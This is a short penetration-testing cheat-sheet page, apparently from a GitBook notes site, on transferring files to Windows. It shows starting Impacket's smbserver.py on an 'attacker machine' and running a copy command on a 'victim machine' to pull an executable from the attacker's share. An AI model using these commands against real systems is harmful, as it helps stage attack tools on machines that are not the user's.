---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: true
---

# Transferring files

## Windows

## Impacket-smbserver.py

```bash
smbserver.py <share> /path/to/file    #attacker machine
copy \\$IP\<share>\file.exe    # victim machine
```
